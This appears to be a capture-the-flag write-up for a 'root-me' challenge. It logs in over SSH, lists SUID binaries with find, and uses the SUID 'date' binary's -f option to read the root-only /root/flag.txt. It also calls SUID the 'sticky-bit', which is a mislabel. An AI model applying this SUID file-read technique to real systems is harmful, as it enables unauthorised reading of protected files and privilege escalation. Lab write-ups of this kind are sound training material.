# root-me
Points: 400
- SSH into the challenge host, 0.cloud.chals.io on port 19777
- **Username:** *ubuntu* **Password:** *jctf2022!*
- Find the flag

## Solving

We have login credentials for a server... so let's dive in:

```
ssh ubuntu@0.cloud.chals.io -p 19777

```

Okay... first we check sudo permissions, therefore just use `sudo -l`, but we don't have any permissions.
So let's look for some other quickwins, shall we?

There is something called `sticky-bit` in linux, with this we could possibly escalate our priviledges. 

```
ubuntu@5f2d47a58826:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/date
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Ah great - there are some bins we could use... 	I'll go with [date](https://gtfobins.github.io/gtfobins/date/#suid). with this we can read a file with root permissions.
Let's try that:

```
ubuntu@5f2d47a58826:~$ LFILE=/root/flag.txt
ubuntu@5f2d47a58826:~$ date -f $LFILE
date: invalid date 'jctf{4cc355_6r4n73d}'
```

Great, there it is :-)

## GTFO bins
Please keep this in mind. Sometimes the sticky bit is neseccary, but it is also dangerous. The github page [gtfobins.github.io](https://gtfobins.github.io/gtfobins/) will show the tricks to weaponize such bins.
